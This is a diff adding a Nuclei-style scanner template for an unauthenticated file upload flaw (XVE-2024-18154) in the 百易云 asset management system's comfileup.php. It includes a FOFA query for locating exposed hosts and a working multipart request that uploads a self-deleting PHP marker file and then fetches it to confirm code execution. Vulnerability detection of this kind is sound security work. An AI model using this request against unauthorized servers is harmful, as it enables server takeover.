@@ -1,0 +1,44 @@
+id: baiyiyun-comfileup-File-upload
+
+info:
+  name: 百易云资产管理运营系统 comfileup.php 任意文件上传(XVE-2024-18154)
+  author: HuanXiong
+  severity: critical
+  description: |-
+    fofa: body="不要着急，点此"
+    百易云资产管理运营系统 comfileup.php 接口存在文件上传漏洞，未经身份验证的攻击者通过漏洞上传恶意后门文件，执行任意代码，从而获取到服务器权限。
+  reference:
+    - 
+  tags: File upload
+  
+http:
+  - raw:
+      - |
+        POST /comfileup.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=--------1110146050
+
+        ----------1110146050
+        Content-Disposition: form-data; name="file";filename="test.php"
+
+        <?php print('pboyjnnrfipmplsukdeczudsefxmywe');unlink(__FILE__);?>
+        ----------1110146050--
+      
+      - |
+        GET /uploads/{{uploadfile}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+       - type: regex 
+         part: body
+         name: uploadfile
+         group: 1
+         regex:
+            - '(\w+\d.+?\.php)'
+         internal: true
+
+    matchers:
+      - type: dsl
+        name: 任意文件上传
+        dsl:
+          - "status_code==200 && contains_all(body,'pboyjnnrfipmplsukdeczudsefxmywe')"
